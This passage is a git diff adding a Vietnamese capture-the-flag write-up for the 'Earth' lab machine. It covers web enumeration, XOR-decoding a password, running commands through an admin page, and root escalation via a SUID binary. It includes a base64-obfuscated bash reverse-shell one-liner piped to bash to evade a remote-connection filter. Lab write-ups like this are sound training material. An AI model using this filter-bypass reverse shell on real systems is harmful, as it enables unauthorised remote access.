@@ -739,6 +739,141 @@ Done!
 ![image](https://user-images.githubusercontent.com/86275419/224831927-f318cd5a-2cb8-422b-9781-4741cdb383f6.png)
 
 
+# 6. Earth
+
+## Scan
+
+![image](https://user-images.githubusercontent.com/86275419/224834150-e5207c9e-b494-44b4-b886-2a74d079b466.png)
+
+IP: `192.168.44.120`
+
+![image](https://user-images.githubusercontent.com/86275419/224834746-38d46afd-bbb2-4157-8983-6b50d819f017.png)
+
+Bài này yêu cầu ta phải config dns
+
+![image](https://user-images.githubusercontent.com/86275419/224835135-ba2dcc40-f2c7-45e2-83af-db2cc385d3ac.png)
+
+## Web Exploit
+
+![image](https://user-images.githubusercontent.com/86275419/224835528-4117bbdd-0c09-4594-925d-71af8203bafa.png)
+
+Fuzz subdir
+
+![image](https://user-images.githubusercontent.com/86275419/224837567-b018b8b4-951b-4b79-a3f1-d32feeff0ed1.png)
+
+![image](https://user-images.githubusercontent.com/86275419/224837666-10b6253c-bf38-40fe-bd34-6e0e47009286.png)
+
+Truy cập /robots.txt và /admin xem có gì hay không
+
+![image](https://user-images.githubusercontent.com/86275419/224841622-b622f279-dca7-4444-ad98-de7d202448f2.png)
+
+![image](https://user-images.githubusercontent.com/86275419/224837746-767e97e5-4301-45dd-8713-be5dd9b0fcbb.png)
+
+Ta chú ý vào `/testingnotes.*`
+
+Ta thử lần lượt các extension phổ biến
+
+![image](https://user-images.githubusercontent.com/86275419/224838120-56a38b4a-d676-43a7-98a5-e9d84ea190de.png)
+
+`.txt` cho ta một số thông tin
++ Thông điệp được mã hóa bằng XOR (thông điệp ta lấy ở earth.local)
++ Key đặt ở file testdata.txt
++ User là `terra`
+
+file testdata.txt:
+
+![image](https://user-images.githubusercontent.com/86275419/224840204-c2882b27-debf-40a4-b10c-f9eb981cf9e0.png)
+
+Giờ ta đi giải mã thôi, ở đây mình sử dụng CyberChef
+
+![image](https://user-images.githubusercontent.com/86275419/224840897-efa7f938-3c83-49a9-b0f4-787fd1fb3035.png)
+
+Để ý kỹ thì thấy rằng 2 thông điệp đầu hoàn toàn vô nghĩa, thông điệp thứ 3 là lặp lại của một từ `earthclimatechangebad4humans` -> đây là mật khẩu 
+
+Giờ ta sẽ login vào thử
+
+![image](https://user-images.githubusercontent.com/86275419/224841330-22c6e04d-05ad-419d-a95e-4f9cfba852f4.png)
+
+Login thành công
+
+![image](https://user-images.githubusercontent.com/86275419/224841753-f3293d1a-e095-48f0-8225-41a264682ef8.png)
+
+Đây là trang cho phép ta chạy command, vậy thì giờ ta chỉ cần tạo reverse shell về thôi 
+
+![image](https://user-images.githubusercontent.com/86275419/224841991-cb3eba31-a012-4790-bf8c-f5bb1b947f03.png)
+
+:)) Đúng là đời không như là mơ `Remote connections are forbidden`
+
+Giờ mình phải tìm cách khác để lấy được shell về
+
+Sau một hồi tìm hiểu thì mình tìm được cách bypass như sau
+
+Đầu tiên mình encode base64 reverse shell của mình 
+
+![image](https://user-images.githubusercontent.com/86275419/224843464-f7761aaa-fd0b-4c88-a0aa-7993f71d5e70.png)
+
+Sau đó tại CLI Command, mình sẽ chạy lệnh decode làm đầu vào của `bash` để thực thi
+
+`echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NC4xMTUvNDQ0NCAwPiYxCg==' | base64 -d | bash`
+
+![image](https://user-images.githubusercontent.com/86275419/224843906-a6367fca-2939-42e4-9796-fe80943d88df.png)
+
+![image](https://user-images.githubusercontent.com/86275419/224843859-89967af9-bbd1-4fde-b25a-46bdec74d341.png)
+
+Vậy là ta đã lấy được shell
+
+## Priv
+
+Giờ nhanh chóng thì mình vác linpeas sang chạy xem có thông tin gì khai thác được không
+
+![image](https://user-images.githubusercontent.com/86275419/224845462-081dc9d5-e748-41b5-8a9d-1d1355587d65.png)
+
+Để ý suid có một file `reset_root` khá là lạ, mình sẽ exploit xem có gì không
+
+![image](https://user-images.githubusercontent.com/86275419/224846184-5b5b0055-a087-4c5d-943e-c00053251dc2.png)
+
+Chạy thử thì mình cũng chưa biết nó thực hiện cái gì 
+
+![image](https://user-images.githubusercontent.com/86275419/224846288-fa577986-26a3-4d9b-bd62-ef2124e7ec34.png)
+
+Sử dụng `strings` để xem binary thì thấy nó có command thay đổi password root thành `earth`, nhưng khi mình chạy nó lại fail, đến đây mình stuck hoàn toàn do chưa có kiến thức về reverse
+
+Sau khi tham khảo một số WU trên mạng thì mình biết được một số thông tin sau
+
+![image](https://user-images.githubusercontent.com/86275419/224847124-f9723f63-84a3-40af-a934-d4118e7ac001.png)
+
+Đây là code của reset_root sau khi reverse. Pasword sẽ thay đổi nếu xảy ra 3 điều kiện dưới đây
+
+![image](https://user-images.githubusercontent.com/86275419/224847965-96ef0f1c-7e7f-49c0-90ff-bbde7ba78f4c.png)
+
++ Điều kiện 1: truy cập được /dev/shm/kHgTFI5G
++ Điều kiện 2: truy cập được /dev/shm/Zw7bV9U5
++ Điều kiện 3: truy cập được /tmp/kcM0Wewe
+
+Vì vậy, bây giờ ta phải tạo được 3 file ở đúng vị trí như trên 
+
+![image](https://user-images.githubusercontent.com/86275419/224848404-50385bc7-2df0-440b-af44-c5e466a72aff.png)
+
+Chạy lại `reset_root`
+
+![image](https://user-images.githubusercontent.com/86275419/224848500-ea479b5b-ab5f-44f6-b1c1-e0245955bc94.png)
+
+Vậy là đã đổi password root sang Earth thành công
+
+![image](https://user-images.githubusercontent.com/86275419/224848650-efea7647-55f0-47a5-834d-dc328ec0b144.png)
+
+Done!
+
+![image](https://user-images.githubusercontent.com/86275419/224848714-6c2c5607-65d3-4c22-b921-4a9a7a8490c4.png)
+
+# 7. 
+
+
+
+
+
+
+
 
 
 
